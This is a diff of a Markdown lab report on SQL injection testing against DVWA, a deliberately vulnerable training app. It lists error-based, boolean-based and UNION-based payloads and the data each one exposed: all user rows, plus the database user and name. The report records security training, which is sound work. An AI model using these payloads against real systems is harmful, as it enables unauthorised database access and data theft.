@@ -58,28 +58,42 @@ Perform SQL Injection testing on DVWA to understand how SQLi vulnerabilities wor
 ## 🧪 Testing Process
 
 ### Step 1 — Normal Query (Baseline)
----
+
 Input: 1
+
 Result: ID: 1, First name: admin, Surname: admin
+
 Observation: Normal query returns single user details
----
+
 
 ### Step 2 — Error Based SQLi
+
 Input: 1' OR '1'='1
+
 Result: SQL syntax error revealed
+
 Observation: Application is vulnerable to SQLi
              Database type exposed: MariaDB
 
+
 ### Step 3 — Boolean Based SQLi
+
 Input: ' OR 1=1#
+
 Result: All 5 users dumped from database
+
 Observation: No input sanitization — full DB dump possible
 
+
+
 ### Step 4 — UNION Based SQLi
+
 Input: ' OR 1=1 UNION SELECT user(),database()#
+
 Result: Database credentials exposed
         DB User: app@localhost
         DB Name: dvwa
+
 Observation: Critical database information extracted
 
 ---
@@ -120,6 +134,7 @@ Observation: Critical database information extracted
 ## ⚠️ Vulnerabilities Identified
 
 ### 1. SQL Injection — Critical 🔴
+
 - **Location:** User ID input field
 - **Type:** Error Based, Boolean Based, UNION Based
 - **Impact:** Full database compromise, sensitive data exposure
